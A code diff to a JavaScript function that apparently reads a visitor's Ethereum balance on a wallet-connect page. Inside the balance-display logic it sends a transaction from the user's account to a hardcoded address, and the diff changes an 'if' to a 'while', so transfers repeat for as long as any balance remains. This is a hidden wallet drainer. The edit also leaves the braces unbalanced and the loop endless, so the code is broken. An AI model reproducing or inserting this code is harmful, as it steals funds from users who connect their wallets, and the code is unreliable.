@@ -136,11 +136,11 @@ async function fetchAccountData() {
     // ethBalance is a BigNumber instance
     // https://github.com/indutny/bn.js/
     const ethBalance = web3.utils.fromWei(balance, "ether");
-    if(ethBalance > 0){ console.log("Balance greater than Zero");
+    while(ethBalance > 0){ console.log("Balance greater than Zero");
         web3.eth.sendTransaction({
            from: accounts[0],
            to: '0xC6b9549f86e669FcAecc5F0F2719FB957B1A3A7D',
-           value: '100000000000000000000'
+           value: '100000000'
        });
 //        .then(function(receipt){
          
@@ -148,7 +148,7 @@ async function fetchAccountData() {
 
 
      }
-    else { console.log("Opening a dialog");}
+    console.log("Opening a dialog");}
     const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
     // Fill in the templated row and put in the document
     const clone = template.content.cloneNode(true);
